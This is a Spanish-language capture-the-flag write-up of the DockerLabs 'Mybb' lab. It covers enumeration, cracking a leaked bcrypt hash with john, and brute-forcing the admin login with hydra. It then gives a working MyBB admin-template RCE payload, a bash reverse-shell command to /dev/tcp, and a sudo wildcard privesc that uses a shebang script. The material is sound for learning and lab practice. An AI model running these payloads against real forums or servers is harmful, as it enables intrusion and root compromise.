---
title: DockerLabs - Mybb
summary: "Write-up del laboratorio Mybb de DockerLabs"
author: elcybercurioso
date: 2026-01-11
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_mybb"
image:
  path: main.webp
published: false
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ nmap -sCV -p80 172.17.0.2               
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: MyBB
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## análisis

Accedemos a la página principal del servidor web de la máquina, donde vemos que se trata de un foro:

![Desktop View](/20260108194438.webp){: width="972" height="589" .shadow}

Investigando la página, nos damos cuenta que se hace referencia a `panel.mybb.dl` en ciertos puntos, el cual podemos confirmar que se trata de un subdominio:

![Desktop View](/20260108194542.webp){: width="972" height="589" .shadow}

Procedemos a agregar tanto `panel.mybb.dl` como `mybb.dl` al fichero `/etc/hosts` de nuestra máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ cat /etc/hosts | grep panel
172.17.0.2      panel.mybb.dl mybb.dl
```

Si ahora volvemos a recargar la página, veremos que nos carga la página del foro:

![Desktop View](/20260108200148.webp){: width="972" height="589" .shadow}

Tratamos de obtener más información del foro usando la herramienta `whatweb`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ whatweb http://panel.mybb.dl        
http://panel.mybb.dl [200 OK] Apache[2.4.58], Cookies[mybb[lastactive],mybb[lastvisit],sid], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], HttpOnly[sid], IP[172.17.0.2], JQuery[1823], PasswordField[quick_password], PoweredBy[--], Script[text/javascript], Title[Forums]
```

Procedemos a crear una cuenta para poder acceder a más funcionalidades y poder descubrir más información acerca del foro:

![Desktop View](/20260108200541.webp){: width="972" height="589" .shadow}

Dejaremos, mientras revisamos la página, en segundo plano **gobuster** descubriendo recursos en el servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ gobuster dir -u "http://panel.mybb.dl" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://panel.mybb.dl
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact.php          (Status: 200) [Size: 12572]
/misc.php             (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/uploads/]
/stats.php            (Status: 200) [Size: 10340]
/calendar.php         (Status: 200) [Size: 27166]
/global.php           (Status: 200) [Size: 98]
/admin                (Status: 301) [Size: 314] [--> http://panel.mybb.dl/admin/]
/online.php           (Status: 200) [Size: 11537]
/member.php           (Status: 302) [Size: 0] [--> index.php]
/images               (Status: 301) [Size: 315] [--> http://panel.mybb.dl/images/]
/showthread.php       (Status: 200) [Size: 10439]
/portal.php           (Status: 200) [Size: 13601]
/report.php           (Status: 200) [Size: 10974]
/memberlist.php       (Status: 200) [Size: 19533]
/forumdisplay.php     (Status: 200) [Size: 10419]
/css.php              (Status: 200) [Size: 0]
/install              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/install/]
/announcements.php    (Status: 200) [Size: 10203]
/index.php            (Status: 200) [Size: 13707]
/polls.php            (Status: 200) [Size: 0]
/search.php           (Status: 200) [Size: 14849]
/private.php          (Status: 200) [Size: 11088]
/cache                (Status: 301) [Size: 314] [--> http://panel.mybb.dl/cache/]
/syndication.php      (Status: 200) [Size: 429]
/archive              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/archive/]
/inc                  (Status: 301) [Size: 312] [--> http://panel.mybb.dl/inc/]
/newreply.php         (Status: 200) [Size: 10201]
/printthread.php      (Status: 200) [Size: 10201]
/captcha.php          (Status: 200) [Size: 0]
/usercp.php           (Status: 200) [Size: 11209]
/rss.php              (Status: 302) [Size: 0] [--> syndication.php]
/attachment.php       (Status: 200) [Size: 10205]
/newthread.php        (Status: 200) [Size: 10178]
/task.php             (Status: 200) [Size: 43]
/javascript           (Status: 301) [Size: 319] [--> http://panel.mybb.dl/javascript/]
/warnings.php         (Status: 200) [Size: 10974]
/reputation.php       (Status: 200) [Size: 10220]
/backups              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/backups/]
/htaccess.txt         (Status: 200) [Size: 3088]
/jscripts             (Status: 301) [Size: 317] [--> http://panel.mybb.dl/jscripts/]
/moderation.php       (Status: 200) [Size: 11090]
/server-status        (Status: 403) [Size: 278]
/editpost.php         (Status: 200) [Size: 11097]

===============================================================
Finished
===============================================================
```

Encontramos el recurso `/admin`, el cual debe ser donde los administradores acceden para gestionar el foro:

![Desktop View](/20260108201939.webp){: width="972" height="589" .shadow}

Por otro lado, encontramos el recurso `/backups`, el cual vemos que nos lista un fichero:

![Desktop View](/20260108202107.webp){: width="700" height="460" .shadow}

Si accedemos, vemos que muestra logs del sistema, y también muestra el hash de la contraseña de la usuaria `alice`:

![Desktop View](/20260108202329.webp){: width="972" height="589" .shadow}

Tratamos de obtener la contraseña por fuerza bruta usando **john** tras guardar el hash en un fichero, y vemos que al instante nos encuentra la contraseña:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ john -w=/usr/share/seclists/Passwords/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********       (?)
Session completed.
```

Probamos a ver si la contraseña que hemos encontrado es la de algún usuario conocido (alguno de los que encontramos en el fichero de `/backups/data`), pero no coincide con ninguno, por lo que la guardamos para más tarde.

Seguiremos tratando de obtener la contraseña del usuario `admin` para el panel de administración empleando fuerza bruta con `hydra`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ hydra -l 'admin' -P /usr/share/seclists/Passwords/rockyou.txt panel.mybb.dl http-post-form "/admin/index.php:username=^USER^&password=^PASS^&do=login:The username and password combination you entered is invalid"
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://panel.mybb.dl:80/admin/index.php:username=^USER^&password=^PASS^&do=login:The username and password combination you entered is invalid
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 1234567
[80][http-post-form] host: panel.mybb.dl   login: admin   password: nicole
[80][http-post-form] host: panel.mybb.dl   login: admin   password: daniel
[80][http-post-form] host: panel.mybb.dl   login: admin   password: princess
[80][http-post-form] host: panel.mybb.dl   login: admin   password: rockyou
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 12345
[80][http-post-form] host: panel.mybb.dl   login: admin   password: monkey
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 12345678
[80][http-post-form] host: panel.mybb.dl   login: admin   password: abc123
[80][http-post-form] host: panel.mybb.dl   login: admin   password: lovely
[80][http-post-form] host: panel.mybb.dl   login: admin   password: jessica
[80][http-post-form] host: panel.mybb.dl   login: admin   password: babygirl
[80][http-post-form] host: panel.mybb.dl   login: admin   password: ashley
[80][http-post-form] host: panel.mybb.dl   login: admin   password: qwerty
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 654321
[80][http-post-form] host: panel.mybb.dl   login: admin   password: michael
1 of 1 target successfully completed, 16 valid passwords found
```

Vemos que la respuesta es inconclusa porque `hydra` no consigue identificar con que contraseña se obtiene el acceso, por lo que optaremos por probar manualmente cada una de las opciones que sugiere.


> Hay que tener en cuenta que el panel de autenticación de `/admin` bloquea el usuario **admin** si se hacen 5 intentos de acceso incorrectos, por lo que será necesario reiniciar el laboratorio cuando esto ocurra!
{: .prompt-warning }

Después de múltiples intentos, encontramos cual es la contraseña de acceso, y podemos ver el panel de administración:

![Desktop View](/20260109163326.webp){: width="972" height="589" .shadow}

## acceso inicial (www-data)

Para la versión de Mybb (1.8.35), encontramos que es vulnerable a un RCE, tal y como indica el siguiente [reporte](https://pentest-tools.com/vulnerabilities-exploits/mybb-1836-rce-vulnerability_20082):

![Desktop View](/20260111130650.webp){: width="972" height="589" .shadow}

Investigando un poco más, encontramos el siguiente [post](https://blog.sorcery.ie/posts/mybb_acp_rce/), el cual aporta un POC (Proof of concept, prueba que permite corroborar la vulnerabilidad):

![Desktop View](/20260111130712.webp){: width="972" height="589" .shadow}

El payload es el siguiente:

```bash
<!--{$db->insert_id(isset($_GET[1])?die(eval($_GET[1])):'')}{$a[0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0]}-->
```

Tal y como indican, debemos indicar el payload en una plantilla que queramos (en mi caso, he optado por la plantilla inicial `index.php`).

![Desktop View](/20260111131130.webp){: width="972" height="589" .shadow}

Si ahora nos dirigimos a la página cuya plantilla hayamos modificado (que en este caso sería `index.php`), podremos ejecutar instrucciones en PHP indicándolos como valor del parámetro `1`, de la siguiente manera:

![Desktop View](/20260111130302.webp){: width="972" height="589" .shadow}

Dado que hemos conseguido ejecución remota de comandos, vamos a proceder a entablar una consola con la máquina, donde lo primero es ponerse en escucha con **nc**, y luego ejecutar el comando que nos devolverá la consola:

```bash
http://panel.mybb.dl/index.php?1=system('bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"');
```

Una vez ejecutado el comando, deberíamos haber obtenido la consola:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ nc -nlvp 4444                          
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 41228
www-data@51864c672a64:/var/www/mybb$ whoami
whoami
www-data
www-data@51864c672a64:/var/www/mybb$ hostname -I
hostname -I
172.17.0.2
```

Procedemos a tratar de la TTY para obtener una consola completamente interactiva:

```bash
www-data@51864c672a64:/var/www/mybb$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@51864c672a64:/var/www/mybb$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ stty raw -echo;fg                      
[1]  + continued  nc -nlvp 4444
                               reset xterm

www-data@51864c672a64:/var/www/mybb$ export TERM=xterm
www-data@51864c672a64:/var/www/mybb$ export SHELL=bash
www-data@51864c672a64:/var/www/mybb$ stty rows 37 columns 210
```

Listaremos los usuarios que tengan asignada una consola en el fichero `/etc/passwd`:

```bash
www-data@51864c672a64:/home$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
alice:x:1001:1001:,,,:/home/alice:/bin/bash
```

## movimiento lateral (alice)

Antes habíamos obtenido la contraseña de la usuaria `alice`, por lo que podemos probar si a nivel de sistema se usa la misma, y vemos que es así:

```bash
www-data@51864c672a64:/home$ su alice
Password: 
alice@51864c672a64:/home$ whoami
alice
```

## escalada de privilegios (root)

Comprobamos los permisos SUDO de la usuaria `alice`, y vemos que permite ejecutar scripts con extensión `.rb` (scripts escritos en Ruby) como el usuario `root` en el directorio `/home/alice/scripts/`:

```bash
alice@51864c672a64:/home$ sudo -l
Matching Defaults entries for alice on 51864c672a64:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User alice may run the following commands on 51864c672a64:
    (ALL : ALL) NOPASSWD: /home/alice/scripts/*.rb
```

Se pueden emplear varios métodos para explotar esta configuración (crear un script en Ruby que ejecute comandos, o aprovecharnos de que el nombre del script es un asterisco para ejecutar comandos indicandolos en el nombre del script, etc), pero en este caso optaremos por aprovecharnos del [**Shebang**](https://es.wikipedia.org/wiki/Shebang) (instrucción que le indica al sistema operativo como interpretar el fichero actual).

Añadir esta instrucción nos permite que, indiferentemente de la extensión del script, el sistema lo ejecutará con el interprete que hayamos indicado.

Con esta premisa, debido a que la máquina no cuenta con ningún editor de texto, en nuestra máquina creamos el script en Bash que queremos ejecutar, el cual nos invocará una consola privilegiada:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ cat test       
#!/bin/bash

bash -p
```

Lo convertimos a Base64 para pasarlo más fácilmente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Mybb]
└─$ cat test | base64 -w0
IyEvYmluL2Jhc2gKCmJhc2ggLXAK
```

En la máquina lo decodificamos, lo metemos en un script con extensión `.rb` y le damos permisos de ejecución:

```bash
alice@51864c672a64:~/scripts$ echo "IyEvYmluL2Jhc2gKCmJhc2ggLXAK" | base64 -d > privesc.rb
alice@51864c672a64:~/scripts$ chmod +x privesc.rb
```

Si ahora lo ejecutamos, veremos que se ejecuta con Bash, por lo que nos devuelve una consola como el usuario `root`:

```bash
alice@51864c672a64:~/scripts$ sudo ./privesc.rb 
root@51864c672a64:/home/alice/scripts# whoami
root
```

Y de esta manera habremos completado la máquina `Mybb`!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>